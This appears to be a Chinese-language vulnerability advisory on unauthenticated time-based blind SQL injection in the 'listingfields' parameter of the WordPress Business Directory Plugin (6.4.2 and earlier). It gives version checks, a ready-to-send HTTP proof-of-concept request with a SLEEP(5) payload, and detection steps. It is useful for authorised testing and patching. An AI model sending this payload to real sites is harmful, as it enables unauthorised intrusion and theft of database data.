验证漏洞存在方法
    - 检查目标网站是否安装了Business Directory Plugin for WordPress
    - 确认插件版本是否为6.4.2或更早版本
    - 通过发送带有恶意'listingfields'参数的请求，观察响应时间延迟来判断是否存在时间盲注

漏洞利用方法
    - 该漏洞存在于Business Directory Plugin的'listingfields'参数中，由于对用户输入转义不足和SQL查询准备不充分
    - 攻击者可以构造时间盲注payload，通过响应时间差异来提取数据库信息
    - 漏洞影响：未认证攻击者可以执行SQL注入，提取数据库中的敏感信息
    
PoC示例：
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

action=wpbdp_ajax&handler=search&listingfields[0][key]=test&listingfields[0][value]=1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
```

检测方法：
1. 发送正常请求记录基准响应时间
2. 发送包含SLEEP()函数的payload
3. 如果响应时间明显延迟（如5秒），则表明存在SQL注入漏洞
4. 可以进一步构造更复杂的payload来提取数据库信息

注意事项：
- 该漏洞为时间盲注，需要多次请求和时间分析
- 在实际测试中应考虑网络延迟因素
- 仅用于授权测试目的
